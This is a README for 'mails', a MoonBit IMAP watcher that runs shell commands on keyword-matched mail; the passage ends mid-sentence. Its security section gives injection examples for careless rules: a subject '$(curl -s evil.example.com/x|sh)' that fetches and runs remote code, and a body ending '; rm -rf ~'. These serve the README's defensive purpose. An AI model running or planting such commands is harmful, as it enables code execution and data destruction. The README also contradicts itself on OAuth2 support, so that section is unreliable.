# mails

Watch IMAP mailboxes with `IDLE` and run a shell command when a new message
matches keywords in its subject, body, sender or recipients.

`mails` is a rewrite of [goimapnotify](https://github.com/dsh2dsh/goimapnotify)
in [MoonBit](https://www.moonbitlang.com), with two things added:

- **Keyword rules.** Instead of running one command for every new message, each
  message is matched against rules and only matching rules fire. Rules can look
  at the subject, the decoded text body, the `From` and the `To` headers, and
  can combine keywords with `match = "any"` or `match = "all"`.
- **Encrypted passwords.** `mails.toml` never contains the mailbox password in
  clear text. It stores an AES-256-GCM envelope; the key lives in `.env` next to
  the binary and never in the config file. `mails encrypt` does the sealing.

Everything is one static binary with no runtime dependencies.

## Highlights

- **Keyword rules, not just "new mail".** Each message is matched against
  rules that inspect the subject, the decoded text body, `From` and `To`.
  Keywords can be combined with `match = "any"` or `match = "all"`, compared
  case-insensitively, or treated as regular expressions. See
  [Configuration](#configuration).
- **IMAP IDLE with a polling fallback.** One connection per mailbox. When the
  server advertises `IDLE`, changes arrive immediately; when it does not, the
  client polls every minute. See [How watching works](#how-watching-works).
- **Encrypted passwords.** `mails.toml` stores an AES-256-GCM envelope, never
  the password. The key lives in `.env` and can be a random 32-byte secret or a
  PBKDF2-derived passphrase. See [Credentials](#credentials).
- **Read and send, not just watch.** `mails ls` lists a mailbox, `mails read`
  prints one message and `mails send` delivers a new one over SMTP, so a server
  needs no extra client to look at or answer the mail that triggered a rule.
- **A single static binary.** No Node.js, Python or libc version to worry about
  on Linux: the published binaries are linked against musl statically.
- **Config beside the binary.** `mails.toml` and `.env` are resolved relative to
  the `mails` executable, so one directory can be copied to another machine and
  keep working. There is no global config directory.
- **Runs anything.** A rule command can be a shell string (`sh -c`) or an argv
  array, with `{{subject}}`-style placeholders and `MAILS_*` environment
  variables. See [Placeholders](#placeholders).
- **Safe defaults.** Messages are fetched with `BODY.PEEK` and never marked as
  read, commands have a timeout, and `mails check` verifies the config, the key
  and every IMAP login before you deploy it.

## Install

Native binaries are published for Linux (x86-64 and arm64) and macOS (Apple
silicon). Every method below produces the same `mails` command.

### npm, pnpm, yarn or bun

```sh
npm install -g @tomasko/mails
# pnpm add -g @tomasko/mails
# yarn global add @tomasko/mails
# bun add -g @tomasko/mails
# npx @tomasko/mails version      (run without installing)
```

The npm package is a launcher, not the binary. On the first `mails` run it
downloads the matching release asset, verifies its SHA-256 and caches it.
Nothing is downloaded by `npm install`. The package deliberately declares no
`postinstall`, so it also works under pnpm 12, with `--ignore-scripts`, and via
`npx`. See [`npmjs/README.md`](npmjs/README.md) for the launcher's environment
variables.

With the npm launcher the binary lives in the user cache, so the default
`mails.toml` would live there too. For a long-lived setup, choose a persistent
config path once:

```sh
mkdir -p ~/.config/mails
export MAILS_CONFIG=~/.config/mails/mails.toml
mails init
```

The other install methods put the binary somewhere stable, so the default
next-to-the-binary config is already persistent.

### MoonBit package registry

```sh
moon install kupas/mails/cmd/mails
```

Builds from source with the MoonBit toolchain and installs `mails` into
`~/.moon/bin` (use `--bin DIR` to change that). This is the path to use if you
already develop with MoonBit.

### Install script

```sh
curl -LsSf https://raw.githubusercontent.com/tomasky/mails/master/install.sh | bash
```

No Node.js or MoonBit required. The script accepts `--version 0.2.0`,
`--install-dir DIR` and `--no-verify`, and verifies the published SHA-256
before installing. By default it installs into `~/.local/bin`.

### Prebuilt binary

```sh
curl -L -o mails \
  https://github.com/tomasky/mails/releases/latest/download/mails-linux-x86_64
chmod +x mails
./mails version
```

Replace the asset name with the one for your platform:

| Platform | Release asset |
| --- | --- |
| Linux x86-64 | `mails-linux-x86_64` (static, musl) |
| Linux arm64 | `mails-linux-aarch64` (static, musl) |
| macOS Apple silicon | `mails-darwin-aarch64` |

Each asset has a matching `.sha256` file:

```sh
curl -L -O https://github.com/tomasky/mails/releases/latest/download/mails-linux-x86_64
curl -L -O https://github.com/tomasky/mails/releases/latest/download/mails-linux-x86_64.sha256
sha256sum -c mails-linux-x86_64.sha256
```

### From source

```sh
git clone https://github.com/tomasky/mails && cd mails
moon build --target native --release
mkdir -p ~/.local/bin
install -m 755 _build/native/release/build/cmd/mails/mails.exe ~/.local/bin/mails
```

If `~/.local/bin` is not on `PATH`, add it to your shell profile, or install
with `moon install`, which uses `~/.moon/bin`.

See [Building](#building) for the static Linux build and tests.

## Releases

Releases are tagged `v<version>` (for example `v0.2.0`). Each release publishes
one binary per target plus its `.sha256` checksum; there are no archives,
because the installer, the npm launcher and `curl` all want the bare binary.
Source archives are provided by GitHub for every tag.

The release workflow builds each target on its own runner — `ubuntu-latest`
and `ubuntu-24.04-arm` for the musl static binaries, `macos-15` for Apple
silicon — so no binary inherits another platform's libc. It then publishes the
GitHub release and, if `NPM_TOKEN` is configured, the matching
`@tomasko/mails` package.

Every release asset is also published with a `.sha256` checksum, which the
installer and the npm launcher verify before running the binary.

## Quick start

The configuration file is `mails.toml` in the directory that holds the `mails`
binary. `mails init` writes a commented starter file there.

```sh
mails init                 # writes mails.toml next to the binary and prints the path
$EDITOR /path/printed/by/mails/init/mails.toml

mails keygen               # creates .env with a fresh MAILS_KEY
mails encrypt --account work --write
# prompts for the IMAP password, seals it, and edits mails.toml in place

mails check                # verify config, key and logins
mails watch                # run in the foreground; use a supervisor in production
```

Once it runs, the mailbox is reachable without a mail client:

```sh
mails ls                   # the newest 20 messages: UID, date, sender, subject
mails read 42              # one message, headers and text body
mails send --to you@example.com --subject test --body "hello"
```

If you would rather keep the config somewhere else, pass `--config PATH` or set
`MAILS_CONFIG`. The `.env` file still defaults to the directory of the config
file, and can be changed with `general.env_file`.

## Reading and sending mail

The same config and the same key are used for reading and sending, so there is
nothing extra to install or authenticate.

### `mails ls`

```sh
mails ls                      # newest 20 messages of the first mailbox
mails ls --mailbox Archive -n 50
mails ls --unread
mails ls --json               # one JSON object per message, for scripts
mails folders                 # the mailboxes on the server
```

```text
UID  DATE              FROM                        SUBJECT
3    2025-04-03 09:15  张三 <zhang@example.com>    * 中国层订
2    2025-04-02 11:30  bob@example.com             Invoice 42
1    2025-04-01 10:00  Alice <alice@example.com>   * 你好，一个测试
```

A `*` in front of the subject marks a message that is still unread. The listing
fetches headers only (`Date`, `From`, `Subject`) with `BODY.PEEK`, so it never
marks anything as read, and 50 UIDs per command keeps a large mailbox cheap.

### `mails read`

```sh
mails read 42                 # headers and the decoded text body
mails read 42 --full          # do not truncate the body at 4000 characters
mails read 42 --raw           # exactly what the server sent, headers included
mails read 42 --json
mails read 42 --mailbox Sent
```

The body goes through the same MIME and charset handling as the watcher, so
GBK/GB2312 mail prints as readable Chinese and `text/html`-only mail is stripped
of its tags. Encoded-word subjects are decoded in both `ls` and `read`.

### `mails send`

```sh
mails send --to you@example.com --subject "test" --body "hello"
mails send --to a@example.com,b@example.com --cc c@example.com --subject hi --body-file body.txt
printf 'line one\nline two\n' | mails send --to you@example.com --subject "from stdin"
mails send --to you@example.com --subject "report" --body "see attached" --attach report.pdf
mails send --to you@example.com --subject "html" --html --body "<p>hello</p>"
```

Without `--body`, the body is read from standard input. Recipients may be
repeated, comma separated, semicolon separated, or written as
`Name <address>`. `--bcc` recipients stay out of the headers, as they should.
The message is built as RFC 5322 with a `Date` and a `Message-ID`, a UTF-8
`Content-Type`, base64 transfer encoding and `multipart/mixed` when there are
attachments. Delivery goes over SMTP with `STARTTLS` on port 587 or implicit TLS
on 465, authenticating with `AUTH XOAUTH2`, `PLAIN` or `LOGIN` depending on what
the server offers and whether the account uses a password or an OAuth2 token.

Sending needs `smtp_host` on the account:

```toml
[accounts.work]
host = "imap.example.com"
port = 993
username = "me@example.com"
password = "enc:v1:..."
smtp_host = "smtp.example.com"
# smtp_port = 465            # default 465 (implicit TLS); 587 selects STARTTLS
# smtp_tls = true            # default: port != 587
# smtp_starttls = false      # default: port == 587
# smtp_username = "me@example.com"   # default: username
# smtp_tls_verify = true     # default: tls_verify
```

`From:` is the account's `username` (or `smtp_username`). An account without
`smtp_host` still works for watching; only `send` refuses, with a pointer to
this file.

## Configuration

```toml
[general]
startup_sync = false        # process existing mail on startup
idle_timeout = "29m"        # re-enter IDLE this often
reconnect_delay = "30s"     # first reconnect backoff, doubled up to 5m
max_body_bytes = 262144     # fetch at most this much of each body
command_timeout = "30s"     # default rule timeout
body_chars = 4000           # default {{body}} truncation

env_file = ".env"           # relative to this file
key_env = "MAILS_KEY"       # variable holding the encryption key

[[rules]]
name = "invoice"
keywords = ["invoice", "payment due"]
fields = ["subject", "body"]
match = "any"               # "any" (default) or "all"
case_sensitive = false      # default false
regex = false               # treat keywords as MoonBit regexes
command = 'notify-send "{{subject}}" "{{from}}"'

[[rules]]
name = "from-boss"
keyword = "boss@example.com"
fields = ["from"]
exec = ["/usr/local/bin/on-boss-mail", "--subject", "{{subject}}"]

[accounts.work]
host = "imap.example.com"
port = 993
username = "me@example.com"
password = "enc:v1:..."     # written by `mails encrypt`
mailboxes = ["INBOX", "Work"]
# tls = true
# tls_verify = true
# startup_sync = true
# idle_timeout = "10m"
# reconnect_delay = "1m"
# max_body_bytes = 1048576
```

Rules can be global (`[[rules]]`) or per account
(`[[accounts.work.rules]]`). Global rules run first, then the account's rules.

### IMAP hosts for common providers

Most providers use SSL on port 993; set `tls = true` and keep `tls_verify =
true`. Use an app-specific password where the provider requires one (Gmail,
iCloud, Fastmail, Yahoo, and most others with 2FA).

| Provider | `host` | `port` | `tls` | Notes |
| --- | --- | --- | --- | --- |
| Gmail / Google Workspace | `imap.gmail.com` | 993 | `true` | Needs an App Password with 2FA; "less secure apps" is gone |
| Outlook / Microsoft 365 | `outlook.office365.com` | 993 | `true` | **OAuth2 only** — basic auth is permanently disabled, see below |
| Yahoo Mail | `imap.mail.yahoo.com` | 993 | `true` | App Password required |
| iCloud Mail | `imap.mail.me.com` | 993 | `true` | Apple ID app-specific password |
| Fastmail | `imap.fastmail.com` | 993 | `true` | App password recommended |
| Proton Mail | `127.0.0.1` | 1143 | `true` | Via Proton Mail Bridge (local, self-signed → `tls_verify = false`) |
| Zoho Mail | `imap.zoho.com` | 993 | `true` | App-specific password with 2FA |
| GMX | `imap.gmx.com` | 993 | `true` | |
| AOL Mail | `imap.aol.com` | 993 | `true` | |
| Yandex Mail | `imap.yandex.com` | 993 | `true` | Create an app password in the Yandex ID settings |
| Mail.ru | `imap.mail.ru` | 993 | `true` | App password required |
| QQ Mail | `imap.qq.com` | 993 | `true` | Enable IMAP and create an authorisation code (授权码) in the web settings; use that code as `password` |
| 163 / 126 Mail | `imap.163.com` | 993 | `true` | Enable IMAP and set a client authorisation password (客户端授权密码) |
| Tencent Exmail (企业微信邮箱) | `imap.exmail.qq.com` | 993 | `true` | Admin must allow IMAP in the WeCom console; then enable it under 设置 → 收发信设置 and generate a client password (客户端专用密码) |
| Sina Mail | `imap.sina.com` | 993 | `true` | Enable IMAP in the web settings |
| Dovecot / self-hosted | your server | 993 | `true` | `tls_verify = false` only for self-signed certs |

Every provider in this table accepts a normal password or an app password, so
`auth = "password"` (the default) works and the OAuth2 setup below is only
needed for Outlook/Microsoft 365 and for Gmail accounts that cannot enable
2FA.

### Providers that require OAuth2

Microsoft disabled basic authentication for IMAP, POP and SMTP in Exchange
Online in October 2022, and for Outlook.com/Hotmail consumer accounts on
16 September 2024. It cannot be switched back on: not by a tenant admin, not
by support, and an app password does not help either. Turning IMAP on in the
account settings is therefore not enough — the login itself is refused before
any mailbox is reached:

```text
server rejected 'LOGIN "you@outlook.com" <redacted>': NO  Basic authentication is disabled.
```

`mails` speaks IMAP `LOGIN` (RFC 3501, username + password) only. It does not
implement OAuth2/XOAUTH2, so **no configuration can make an Outlook or
Microsoft 365 account work directly**. Options:

- **Use a provider that still accepts a password or an app password**: Gmail
  (with 2FA + App Password), iCloud, Fastmail, Yahoo, Zoho, GMX, AOL, or a
  self-hosted server.
- **Put an OAuth bridge in front of it.** A local gateway such as
  [DavMail](https://davmail.sourceforge.net/) signs in with OAuth2 and exposes
  a plain IMAP port on localhost; point `mails` at that port with a dummy
  password:

  ```toml
  [accounts.outlook]
  host = "127.0.0.1"
  port = 1143
  username = "you@outlook.com"
  password = "unused-bridge-placeholder"   # the bridge holds the OAuth token
  mailboxes = ["INBOX"]
  tls = false              # loopback only; do not expose this port
  ```

- **Use the built-in OAuth2 support** (see below), which needs no browser on
  the server.

#### Headless OAuth2 sign-in

`mails` implements the OAuth2 **device authorization grant** (RFC 8628) and
IMAP `AUTHENTICATE XOAUTH2`, so an account can be connected from a server that
has no browser or no display at all:

```bash
mails login --account outlook
```

```text
outlook: sign in to microsoft
  1. open https://microsoft.com/devicelogin
  2. enter the code: H7K2-QP4LM
  waiting up to 15 minutes for approval (Ctrl-C to abort)...
  saved the refresh token to /etc/mails/.outlook.oauth
  IMAP login ok
```

The URL is opened on any device — a phone is enough. The refresh token is
written to `.<account>.oauth` next to `mails.toml` with mode `0600`, sealed with
AES-256-GCM when the key from `.env` is present. Access tokens are refreshed in
memory and never written to disk.

```toml
[accounts.outlook]
host = "outlook.office365.com"
port = 993
username = "you@outlook.com"
auth = "xoauth2"
oauth_provider = "microsoft"
oauth_client_id = "<public client id>"
mailboxes = ["INBOX"]

[accounts.gmail]
host = "imap.gmail.com"
port = 993
username = "you@gmail.com"
auth = "xoauth2"
oauth_provider = "google"
oauth_client_id = "<public client id>"
mailboxes = ["INBOX"]
```

| Key | Meaning |
| --- | --- |
| `auth` | `password` (default) or `xoauth2` |
| `oauth_provider` | `microsoft` (default), `google`, or `custom` |
| `oauth_client_id` | client id of a **public** app with the device code flow enabled |
| `oauth_tenant` | Microsoft tenant: `common` (default), `consumers`, `organizations` or a tenant id |
| `oauth_scope` | override the scope; defaults cover IMAP for Microsoft and Google |
| `oauth_device_endpoint` | device code endpoint, required for `custom` |
| `oauth_token_endpoint` | token endpoint, required for `custom` |
| `oauth_token_file` | where the refresh token lives; default `.<account>.oauth` |

For Google, use the device flow on a "TV and limited input" OAuth client with
the `https://mail.google.com/` scope. `mails check` verifies that the stored
token still logs in, and `mails login` can be re-run at any time to replace a
revoked token.

##### Outlook / Microsoft 365, step by step

1. Open <https://entra.microsoft.com> → **Applications** → **App registrations**
   → **New registration**.
   - *Name*: `mails`.
   - *Supported account types*: pick what matches your mailbox — "Personal
     Microsoft accounts only" for `@outlook.com`/`@hotmail.com`, "Accounts in
     this organizational directory only" for one company tenant, or "Accounts
     in any organizational directory and personal Microsoft accounts" for both.
   - *Redirect URI*: leave empty; the device flow does not need one.
2. In the new app: **Authentication** → **Advanced settings** → **Allow public
   client flows** = **Yes** → **Save**. This is required, otherwise the token
   endpoint answers `AADSTS7000218`.
3. **API permissions** → **Add a permission** → **APIs my organization uses** →
   **Office 365 Exchange Online** → **Delegated permissions** →
   **`IMAP.AccessAsUser.All`** → **Add permissions**. (For a personal-accounts
   app this API may not be listed; consent is then requested at sign-in.)
4. Copy the **Application (client) ID** from the app's overview page.
5. Configure the account, matching `oauth_tenant` to the choice in step 1:

   ```toml
   [accounts.outlook]
   host = "outlook.office365.com"
   port = 993
   username = "you@outlook.com"
   auth = "xoauth2"
   oauth_provider = "microsoft"
   oauth_tenant = "consumers"      # personal accounts; "organizations" or the
                                   # tenant id for work accounts; "common" for both
   oauth_client_id = "00000000-0000-0000-0000-000000000000"
   mailboxes = ["INBOX"]
   ```

6. Run `mails login --account outlook`, open the printed URL on any device and
   enter the code. After approval the command stores the refresh token and
   prints `IMAP login ok`.
7. `mails check` now passes and `mails watch` keeps running without a browser.

| Symptom | Cause and fix |
| --- | --- |
| `AADSTS50020` user account does not exist in tenant | the client id belongs to an app registered in another tenant (a Microsoft first-party id such as the portal's `74658136-…` cannot be used); copy the id from your own registration and register the app in the tenant that owns the mailbox |
| `AADSTS700016` application not found in tenant | `oauth_tenant` does not match the app's supported account types; use `consumers`, `organizations`, `common` or the tenant id |
| `AADSTS7000218` client authentication failed | **Allow public client flows** is still `No` |
| `AADSTS65001` consent required | add the `IMAP.AccessAsUser.All` permission, or have a tenant admin grant consent |
| `AADSTS500011` resource not found | the app is single-tenant but `oauth_tenant = "common"`; set the tenant id |
| `AUTHENTICATE XOAUTH2` rejected, token is fresh | IMAP is disabled on the mailbox (Exchange: `Set-CASMailbox -ImapEnabled $true`) |
| `LOGIN ... NO Basic authentication is disabled` | the account still uses `auth = "password"`; switch it to `xoauth2` |
| token works but `SELECT` fails | the mailbox has no IMAP-enabled subscription; check the account's Exchange licence |

```toml
[accounts.gmail]
host = "imap.gmail.com"
port = 993
username = "you@gmail.com"
password = "enc:v1:..."     # an App Password, sealed with `mails encrypt`
mailboxes = ["INBOX"]
tls = true
tls_verify = true

[accounts.fastmail]
host = "imap.fastmail.com"
port = 993
username = "you@fastmail.com"
password = "enc:v1:..."
mailboxes = ["INBOX", "Sent"]
tls = true
tls_verify = true
```

### Rule keys

| Key | Default | Meaning |
| --- | --- | --- |
| `name` | `rule-N` | Name used in logs and `{{rule}}` |
| `keywords` | required | Array of keywords; each must appear in one of `fields` |
| `keyword` | – | Single-keyword shorthand |
| `fields` | `["subject", "body"]` | Any of `subject`, `body`, `from`, `to` |
| `match` | `"any"` | `any`: one keyword is enough. `all`: every keyword must match |
| `case_sensitive` | `false` | ASCII/Unicode lowercase comparison |
| `regex` | `false` | Compile keywords as regexes (`(?i:...)` when case-insensitive) |
| `command` | – | Shell string, run with `sh -c` |
| `exec` | – | argv array; the first element is the program |
| `timeout` | `command_timeout` | Kill the command after this duration |
| `workdir` | – | Working directory for the command |
| `body_chars` | `general.body_chars` | Truncate `{{body}}` and `MAILS_BODY` |
| `accounts` | all | Restrict the rule to these account names |
| `mailboxes` | all | Restrict the rule to these mailboxes |

`command` and `exec` are mutually exclusive in spirit; if both are set, `exec`
wins.

### Placeholders

Inside `command` and every `exec` argument:

| Placeholder | Value |
| --- | --- |
| `{{account}}`, `{{mailbox}}`, `{{uid}}` | Where the message lives |
| `{{subject}}`, `{{from}}`, `{{to}}`, `{{date}}`, `{{message_id}}` | Decoded headers |
| `{{body}}` | Readable text body with its line breaks, truncated to `body_chars` |
| `{{rule}}`, `{{keywords}}`, `{{fields}}` | Which rule fired and why |
| `{{*_q}}` | The same value single-quoted for a POSIX shell |

### Message text is untrusted input

`{{subject}}`, `{{from}}`, `{{to}}`, `{{date}}`, `{{message_id}}` and
`{{body}}` are inserted **raw**, and `command` runs under `sh -c`. Anyone who
can send you mail can therefore run a command through your rule: a subject of
``$(curl -s evil.example.com/x|sh)``, or a body ending in `; rm -rf ~`, is
enough. `mails check` and `mails watch` warn about every rule that does this.

`cat {{body}}` is the classic mistake: the body is not one word, so `cat` treats
it as a file name. Two safe ways to read the text:

```toml
# Shell-quoted placeholder: safe whatever the sender wrote.
command = 'printf "%s\n" {{body_q}} >> ~/mail.log'

# Or the environment, which a shell never parses.
command = 'printf "%s\n" "$MAILS_BODY" >> ~/mail.log'
```

`{{*_q}}` single-quotes the value, so `$(...)`, quotes and `;` are all inert.

The full environment for a rule command:

`MAILS_ACCOUNT`, `MAILS_MAILBOX`, `MAILS_UID`, `MAILS_SUBJECT`, `MAILS_FROM`,
`MAILS_TO`, `MAILS_DATE`, `MAILS_MESSAGE_ID`, `MAILS_RULE`,
`MAILS_KEYWORDS`, `MAILS_BODY` (truncated to `body_chars`), `MAILS_BODY_FULL`,
and `MAILS_BODY_TRUNCATED` (`1`) when `MAILS_BODY_FULL` was cut.

A single environment value cannot exceed 128 KiB on Linux (`execve` fails with
`E2BIG`), so `MAILS_BODY_FULL` stops at 60 000 bytes and sets
`MAILS_BODY_TRUNCATED=1`. Use `{{body}}` with a larger `body_chars`, or write the
raw message to a file, when you need every byte.

The body keeps the line breaks of the original message, so a posted notification
reads like the mail. Two things to keep in mind when you post it: JSON strings
need `\n` rather than a real line break, and Markdown renderers (DingTalk, Slack,
Telegram) show a break on a blank line only. This `command` does both:

```sh
body=$(printf '%s\n' "$MAILS_BODY" | awk 'NF { printf "%s\\n\\n", $0 }')
curl -s -H 'Content-Type: application/json' \
  -d "{\"msgtype\":\"markdown\",\"markdown\":{\"title\":\"$MAILS_SUBJECT\",\"text\":\"$body\"}}" \
  "$DINGTALK_WEBHOOK"
```

## Credentials

The account password in `mails.toml` is either an `enc:v1:` envelope or a plain
value (if you use a password helper or a dedicated app password that you do not
mind storing).

```sh
mails keygen                        # writes MAILS_KEY to .env (mode 0600)
mails encrypt --account work        # prints the envelope to paste
mails encrypt --account work --write  # edits mails.toml in place
mails encrypt --account work --new-key --write  # rotate the key first
```

The envelope is `enc:v1:<salt>:<nonce>:<ciphertext+tag>`. Two key forms are
accepted in `.env`:

- `MAILS_KEY=b64:...` — a random 32-byte key (what `keygen` writes), used
  directly.
- `MAILS_KEY=pass:correct horse battery staple` — a passphrase; the AES key is
  derived with PBKDF2-HMAC-SHA256 (100k iterations) and the per-secret salt.

Losing `.env` means the password cannot be recovered; run `mails keygen`
followed by `mails encrypt --write` again. Keep `.env` out of version control.

`MAILS_KEY` may also be set in the environment, which takes precedence only
when the `.env` file does not define it.

## Commands

```
mails <command> [options]

watch       follow mailboxes with IMAP IDLE
sync        process existing matching mail once, then exit
check       verify config, key, logins and mailbox counts
ls          list the newest messages of a mailbox
read        print one message (UID is required)
folders     list the mailboxes on the server
send        send a message over SMTP
encrypt     seal an account password with the key in .env
keygen      create or rotate the encryption key in .env
rules       list configured rules
env         show .env with secret values masked
init        write a commented mails.toml next to the binary
version     print the version
help        print usage
```

Options:

| Option | Effect |
| --- | --- |
| `-c, --config PATH` | Configuration file (default: `mails.toml` next to the binary) |
| `-a, --account NAME` | Operate on one account only |
| `--once` | For `watch`: process existing mail, then exit (same as `sync`) |
| `--write` | For `encrypt`: update `mails.toml` in place |
| `--new-key` | For `encrypt`: rotate the key before sealing |
| `-v, --verbose` | Debug logging |
| `-q, --quiet` | Warnings and errors only |
| `-m, --mailbox NAME` | For `ls`, `read`, `send`: mailbox to read (default: the account's first) |
| `-n, --limit N` | For `ls`: how many messages (default 20) |
| `-u, --unread` | For `ls`: unread messages only |
| `--json` | For `ls`, `read`: machine-readable output |
| `--full` | For `read`: do not truncate the body |
| `--raw` | For `read`: the message exactly as stored |
| `-t, --to ADDR` | For `send`: recipient; repeatable or comma separated |
| `--cc ADDR`, `--bcc ADDR` | For `send`: more recipients |
| `-s, --subject TEXT` | For `send`: subject |
| `-b, --body TEXT`, `--body-file F` | For `send`: body; default is standard input |
| `--html` | For `send`: the body is HTML |
| `--attach FILE` | For `send`: attach a file; repeatable |

## Environment variables

| Variable | Read by | Effect |
| --- | --- | --- |
| `MAILS_CONFIG` | `mails` | Config path when `--config` is not passed |
| `MAILS_KEY` | `mails` | Encryption key fallback when `.env` does not define `general.key_env` |
| `MAILS_QUIET` | `mails` | `1` silences everything but errors (same as `-q`, also dropping warnings) |
| `MAILS_BINARY`, `MAILS_CACHE_DIR`, … | npm launcher | Control the downloaded binary; see [`npmjs/README.md`](npmjs/README.md) |

Rule commands receive their own variables: `MAILS_ACCOUNT`, `MAILS_MAILBOX`,
`MAILS_UID`, `MAILS_SUBJECT`, `MAILS_FROM`, `MAILS_TO`, `MAILS_DATE`,
`MAILS_MESSAGE_ID`, `MAILS_RULE`, `MAILS_KEYWORDS`, `MAILS_BODY` and
`MAILS_BODY_FULL`. See [Placeholders](#placeholders).

## Exit status

| Status | Meaning |
| --- | --- |
| `0` | The command did what it was asked. For `sync` / `watch --once`, every mailbox synced |
| `1` | Bad arguments or config, a missing or wrong key, a failed login, or at least one mailbox failed |

`check` tries every account before failing, so one broken account does not hide
the others. `watch` without `--once` is long-running: it reconnects on its own
and is meant to be stopped by a supervisor with `SIGINT` or `SIGTERM`.

## How watching works

For every configured mailbox, `mails` opens its own connection, logs in,
`SELECT`s the mailbox, and then loops:

1. Enter `IDLE` with `idle_timeout`. The server pushes `EXISTS`/`RECENT` when
   something changes; on timeout the client sends `DONE` and re-enters IDLE.
2. On a change, re-`SELECT` the mailbox to refresh `UIDVALIDITY` and `UIDNEXT`.
3. `UID SEARCH UID <last+1>:*`, then `UID FETCH` each new UID for its header and
   a bounded slice of its text body.
4. Parse MIME, run every matching rule's command, and advance `last_uid`, which
   is also written to `.<account>.<mailbox>.<digest>.cursor` next to
   `mails.toml`, after every message. The digest keeps mailboxes whose names
   differ only in characters that are unsafe in a file name (`Sent Items` versus
   `Sent/Items`) from sharing one cursor.

If the server rejects `IDLE`, the loop falls back to polling every 60 seconds.
The saved cursor is what a reconnect resumes from, so a dropped connection does
not run a rule command twice for the same message; it wins over `UIDNEXT`, which
some servers report as `0` even though mail exists. `UIDVALIDITY` changes reset
the cursor and rescan the mailbox. Connection failures reconnect with
exponential backoff, capped at five minutes.

`startup_sync` decides what the *first* connection of a run does.
`startup_sync = false` skips the mail that is already in the mailbox: the scan
continues at `UIDNEXT - 1`, or, when the server reports no usable `UIDNEXT`, it
starts after the newest message that exists. `true` scans the whole mailbox,
which can be slow on large mailboxes. Either way, a reconnect inside the same
run resumes from the cursor and only processes mail that arrived since. `mails
sync` always scans the whole mailbox once, so it is useful for testing rules
against existing mail; it does not mark anything as read.

Bodies are fetched with `BODY.PEEK`, so watching never marks messages as seen.
`text/plain` is preferred; HTML-only mail is stripped of tags. UTF-8 plus every
charset the WHATWG Encoding Standard knows about is decoded —
GBK/GB2312/GB18030, Big5, Shift_JIS, EUC-JP/KR, ISO-2022-JP and the
ISO-8859/windows-125x families — so Chinese, Japanese and Korean mail matches
and renders correctly. Unknown charsets fall back to a lossy UTF-8 read.

## Running as a service

`mails watch` stays in the foreground and logs to standard error, which is what
supervisors want. A minimal systemd user unit:

```ini
# ~/.config/systemd/user/mails.service
[Unit]
Description=mails IMAP watcher
After=network-online.target

[Service]
ExecStart=%h/.local/bin/mails watch --config %h/.local/bin/mails.toml
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
```

```sh
systemctl --user daemon-reload
systemctl --user enable --now mails
journalctl --user -u mails -f
```

Run `mails check --config ...` once before enabling the unit; it prints the
config path, whether the key was found, and every mailbox it can select.

## Building

Requires the MoonBit toolchain (`moon version --all`) and a C compiler.

```sh
moon build --target native --release
# binary: _build/native/release/build/cmd/mails/mails.exe
```

During development the debug build works too:

```sh
moon build --target native
./_build/native/debug/build/cmd/mails/mails.exe version
```

Tests and the warning-free gate:

```sh
moon test --target native
moon check --target native --deny-warn
moon fmt --check
```

A clean build also compiles the C stubs of the dependencies, and one of them
(`moonbitlang/async`'s thread-pool self-pipe) calls `write` without checking the
result, which GCC flags with `-Wunused-result`. `scripts/patch-deps.sh` silences
exactly that line so the build output holds nothing but our own diagnostics; CI
and the static build script run it after `moon update`. It is idempotent and
changes no behaviour: a failed write there only means the event loop wakes up
spuriously, which it already handles.

### Static Linux build

`scripts/build-linux-static.sh` is what the release workflow uses. A glibc
build records the build machine's symbol versions, so a binary built on a new
runner refuses to start on an older distribution (`GLIBC_2.38 not found`);
linking against musl statically removes that entire class of problem.

```sh
sudo apt-get install musl-tools
./scripts/build-linux-static.sh dist/mails-linux-x86_64
```

The static binary keeps TLS. `moonbitlang/async` normally loads OpenSSL with
`dlopen`, which cannot work in a statically linked program, so a static build
used to fail every TLS connection with `TlsError("failed to load OpenSSL")`.
The script instead builds (or reuses) a musl OpenSSL and links it in,
compiling async's TLS stub from `scripts/tls/openssl_static.c` — a copy of the
upstream loader whose only change is that it references the OpenSSL symbols
directly instead of resolving them at runtime.

| Variable | Meaning |
| --- | --- |
| `MAILS_MUSL_WORKDIR` | scratch directory (default: a fresh temp dir) |
| `MAILS_OPENSSL_VERSION` | OpenSSL to download and build (default `3.5.5`) |
| `MAILS_OPENSSL_SRC` | build the static libs from this source tree |
| `MAILS_OPENSSL_MUSL` | use a prebuilt musl static OpenSSL prefix (`include/`, `lib/`) |
| `MAILS_NO_TLS=1` | build without TLS (smaller; IMAP over TLS won't work) |

## Differences from goimapnotify

- Config is TOML, lives next to the binary, and is not searched for in
  `$XDG_CONFIG_HOME`.
- Desktop notifications are not built in; a rule command can call
  `notify-send`, `terminal-notifier`, or anything else.
- Passwords are encrypted at rest; goimapnotify stores them in clear text.
- Matching is keyword-based with subject/body/from/to fields, not just "run a
  command for every new message".
- IMAP only. JMAP is not implemented.

## Limitations

- **IMAP and SMTP only.** JMAP and POP3 are not implemented. IMAP
  authentication is `LOGIN` or `AUTHENTICATE XOAUTH2`, always with TLS; see
  [Providers that require OAuth2](#providers-that-require-oauth2).
- **`send` does not queue or retry.** It connects, delivers and exits; SMTP
  refusal is reported with the server's status code, and a refused recipient
  fails the command after the others have been tried.
- **`send` has no reply/history tracking.** It writes no copy to `Sent`: use
  `--bcc your-own-address`, or let your provider's SMTP do it if it does.
- **OAuth2 needs a one-time `mails login`.** The device code flow refreshes
  the access token automatically afterwards, but a revoked or expired refresh
  token has to be replaced by running `mails login` again.
- **The cursor is a file next to the config.** `.<account>.<mailbox>.cursor`
  (mode `0600`) records the last handled UID, so a dropped connection resumes
  instead of replaying mail. It is per account and per mailbox. A fresh `mails`
  process still follows `startup_sync`, so mail that arrived while it was down is
  skipped when that is `false`; run `mails sync` to handle it.
- **Text charsets.** UTF-8 plus everything the WHATWG Encoding Standard knows
  about: GBK/GB2312/GB18030, Big5, Shift_JIS, EUC-JP/KR, ISO-2022-JP and the
  ISO-8859/windows-125x single-byte families, so Chinese mail from QQ, 163 and
  Exmail matches and renders correctly. A `text/html` part with no `charset`
  parameter inherits the one its `<meta>` tag declares. Unknown charsets still
  fall back to a lossy UTF-8 read.
- **One connection per mailbox**, and rule commands for a mailbox run
  sequentially. A slow command delays processing of later messages on that
  mailbox; use `timeout` to bound it.
- **Message text is untrusted.** `{{subject}}`, `{{from}}` and `{{body}}` are
  substituted raw into `sh -c`, so use `{{..._q}}` or the `MAILS_*` environment;
